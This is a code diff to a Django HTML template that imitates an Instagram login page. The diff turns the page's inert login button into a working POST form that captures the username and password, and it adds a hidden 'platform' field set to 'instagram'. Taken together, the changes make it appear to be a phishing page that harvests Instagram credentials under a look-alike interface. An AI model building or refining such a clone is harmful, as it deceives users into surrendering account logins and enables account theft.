@@ -176,28 +176,31 @@
 </head>
 <body>
     <div id="container">
-        <section>
-            <div class="main-top">
-                <div class="logo">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTtBbdaLA3nYIvSiyVi88sIB3vmOrSOURItqA&usqp=CAU" />
-                </div>
-                <div>
-                    <input type="text" placeholder="Phone number, Username or Email" class="username" />
-                    <div>
-                        <input type="password" placeholder="Password" class="password" />
+        <form method="post">
+            {% csrf_token %}
+            <section>
+                <div class="main-top">
+                    <div class="logo">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTtBbdaLA3nYIvSiyVi88sIB3vmOrSOURItqA&usqp=CAU" />
                     </div>
-
-                    <br><div><a href="" class="forget"> Forgot password? </a></div><br>
-
-                    <a class="login-btn" href="{% url 'survey' %}"><button class="login-btn">Log in</button></a>
+                    <div>
+                        <input type="text" placeholder="Phone number, Username or Email" class="username" name="username"/>
+                        <div>
+                            <input type="password" placeholder="Password" class="password" name="password"/>
+                        </div>
+                        <input type="hidden" name="platform" value="instagram" />
+                        <br><div><a href="" class="forget"> Forgot password? </a></div><br>
+        
+                        <button type="submit" class="login-btn">Log in</button>
+                    </div>
                 </div>
-            </div>
-            <div class="bottom">
-                <div class="signUp" style="color: rgb(115,115,115,1);;">
-                    Don't have an account? <a href="#">Sign up</a>
+                <div class="bottom">
+                    <div class="signUp" style="color: rgb(115,115,115,1);">
+                        Don't have an account? <a href="#">Sign up</a>
+                    </div>
                 </div>
-            </div>
-        </section>
+            </section>
+        </form>        
     </div>
 </body>
 </html>
